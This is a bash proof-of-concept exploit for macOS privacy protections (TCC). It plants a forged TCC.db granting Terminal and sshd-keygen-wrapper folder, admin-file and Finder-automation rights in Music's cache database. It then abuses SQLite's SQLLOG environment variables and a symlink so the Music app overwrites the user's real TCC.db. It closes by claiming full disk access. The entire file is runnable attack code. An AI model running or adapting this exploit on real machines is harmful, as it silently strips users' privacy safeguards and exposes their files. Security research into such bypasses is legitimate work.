#!/bin/bash

set -e

BASEDIR=$(dirname "$0")
cd $BASEDIR

TARGET_APP_CMDLINE="/System/Applications/Music.app/Contents/MacOS/Music -quitAfterLaunch"
#TARGET_APP_CMDLINE="/System/Applications/Music.app/Contents/MacOS/Music"

# works, even without internet!
TARGET_DB="/Users/$(whoami)/Library/Caches/com.apple.Music/Cache.db"
DB_NUM="00"
# works, even without internet!
#TARGET_DB="/Users/$(whoami)/Library/HTTPStorages/com.apple.Music/httpstorages.sqlite"
#DB_NUM="01"
# works, even without internet!
#TARGET_DB="/Users/$(whoami)/Music/Music/Music Library.musiclibrary/Extras.itdb"
#DB_NUM="02"

TARGET_FILE="/Users/$(whoami)/Library/Application Support/com.apple.TCC/TCC.db"
FDA_TARGET="/Library/Application Support/com.apple.TCC/TCC.db"

TCCDB_SQL=$(cat << EOF
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE admin (key TEXT PRIMARY KEY NOT NULL, value INTEGER NOT NULL);
INSERT INTO admin VALUES('version',23);
CREATE TABLE policies (    id        INTEGER    NOT NULL PRIMARY KEY,     bundle_id    TEXT    NOT NULL,     uuid        TEXT    NOT NULL,     display        TEXT    NOT NULL,     UNIQUE (bundle_id, uuid));
CREATE TABLE active_policy (    client        TEXT    NOT NULL,     client_type    INTEGER    NOT NULL,     policy_id    INTEGER NOT NULL,     PRIMARY KEY (client, client_type),     FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);
CREATE TABLE access (    service        TEXT        NOT NULL,     client         TEXT        NOT NULL,     client_type    INTEGER     NOT NULL,     auth_value     INTEGER     NOT NULL,     auth_reason    INTEGER     NOT NULL,     auth_version   INTEGER     NOT NULL,     csreq          BLOB,     policy_id      INTEGER,     indirect_object_identifier_type    INTEGER,     indirect_object_identifier         TEXT NOT NULL DEFAULT 'UNUSED',     indirect_object_code_identity      BLOB,     flags          INTEGER,     last_modified  INTEGER     NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),     PRIMARY KEY (service, client, client_type, indirect_object_identifier),    FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.shortcuts',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.securityd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.cloudpaird',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.identityservicesd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.suggestd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.Safari',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.sociallayerd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.upload-request-proxy.com.apple.photos.cloud',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.iad-cloudkit',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.assistant.assistantd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.ScreenTimeAgent',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.syncdefaultsd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.donotdisturbd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.siriknowledged',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.appleaccountd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.passd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.amsaccountsd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.icloud.searchpartyuseragent',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.willowd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.remindd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.cloudphotod',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937171);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.amsengagementd',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937173);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.StatusKitAgent',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937182);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.Passbook',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937182);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.routined',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937182);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.knowledge-agent',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937184);
INSERT INTO access VALUES('kTCCServiceLiverpool','com.apple.textinput.KeyboardServices',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,1670937199);
INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder','com.apple.Terminal',0,2,2,1,X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',NULL,NULL,'UNUSED',NULL,0,1670953394);
INSERT INTO access VALUES('kTCCServiceSystemPolicySysAdminFiles','com.apple.Terminal',0,2,2,1,X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',NULL,NULL,'UNUSED',NULL,0,1670953424);
INSERT INTO access VALUES('kTCCServiceAppleEvents','com.apple.Terminal',0,2,3,1,X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',NULL,0,'com.apple.finder',X'fade0c000000002c00000001000000060000000200000010636f6d2e6170706c652e66696e64657200000003',NULL,1670953426);
INSERT INTO access VALUES('kTCCServiceSystemPolicySysAdminFiles','/usr/libexec/sshd-keygen-wrapper',1,2,2,1,X'fade0c000000003c0000000100000006000000020000001d636f6d2e6170706c652e737368642d6b657967656e2d7772617070657200000000000003',NULL,NULL,'UNUSED',NULL,0,1670953636);
INSERT INTO access VALUES('kTCCServiceAppleEvents','/usr/libexec/sshd-keygen-wrapper',1,2,3,1,X'fade0c000000003c0000000100000006000000020000001d636f6d2e6170706c652e737368642d6b657967656e2d7772617070657200000000000003',NULL,0,'com.apple.finder',X'fade0c000000002c00000001000000060000000200000010636f6d2e6170706c652e66696e64657200000003',NULL,1670953638);
CREATE TABLE access_overrides (    service        TEXT    NOT NULL PRIMARY KEY);
CREATE TABLE expired (    service        TEXT        NOT NULL,     client         TEXT        NOT NULL,     client_type    INTEGER     NOT NULL,     csreq          BLOB,     last_modified  INTEGER     NOT NULL ,     expired_at     INTEGER     NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),     PRIMARY KEY (service, client, client_type));
CREATE INDEX active_policy_id ON active_policy(policy_id);
COMMIT;
EOF
)

echo "[+] Cleanup"
rm -rf pwned
mkdir pwned

echo "[+] Killing Music"
killall Music || true
sleep 1

# TODO: call reset music db helper here if we ran more than once!

# NOTE: optional, but we want to be sure
echo "[+] Resetting all Music DBs"
./helpers/reset_music_dbs.sh
sleep 1
if [ -f "$TARGET_DB" ]
then
	echo "[+] Successfully reset $TARGET_DB"
else
	echo "[-] $TARGET_DB failed to reset, aborting"
	exit -1
fi

echo "[+] Preparing TCC.db"
# add TCC.db entries
echo "$TCCDB_SQL" | sqlite3 pwned/TCC.db
# add content from the DB that Music will use
sqlite3 "$TARGET_DB" ".dump" | sqlite3 pwned/TCC.db
requiredsize=$(stat -f "%z" "pwned/TCC.db")

echo "[+] Overwriting target"

cat pwned/TCC.db > "$TARGET_DB"

echo "[?] TCC.db before:"
ls -aliT "$TARGET_FILE"

echo "[+] Starting Music"
# NOTE: We do this because we need to know what PID Music will have
BASH_CMD=$(cat << EOF
echo -e "\tchild: bash sleep"
sleep 0.5
echo -e "\tchild: music start"
exec $TARGET_APP_CMDLINE
EOF
)
SQLITE_SQLLOG_DIR="$(pwd)/pwned/" SQLITE_SQLLOG_REUSE_FILES=1 bash -c "$BASH_CMD" 1>/dev/null 2>/dev/null &
CHILDPID=$!
echo "[?] Child pid: $CHILDPID"

echo "[+] Placing symlink"
prefixed_filename="pwned/sqllog_$(printf "%05d" $CHILDPID)_${DB_NUM}.db"
echo "[?] Prefixed filename: $prefixed_filename"
ln -sf "$TARGET_FILE" "$prefixed_filename"

echo "[+] Waiting for max 3s"
timeout=1
for i in $(seq 3)
do
	running=$(ps | grep $CHILDPID | grep -v grep | wc -l)
	if [[ running -eq 0 ]]
	then
		echo "[+] Music stopped"
		timeout=0
		break
	fi
	echo "Sleeping... $i"
	sleep 1
done

if [[ timeout -eq 1 ]]
then
	echo "[+] Timeout reached, killing Music"
	kill $CHILDPID || true
	sleep 1
fi

echo "[?] TCC.db after:"
ls -aliT "$TARGET_FILE"
newsize=$(stat -f "%z" "$TARGET_FILE")

echo "[+] Sleeping 1s"
sleep 1

echo "[+] SUCCESS! You have full disk access by automating Finder"
# TODO: TCC.db's size can't be trusted, since it can grow up in size and it
#       won't shrink when we write to it. Find a more reliable indicator!
# TODO: Find another way to prove FDA (not trashing TCC.db with 1337 X's!)

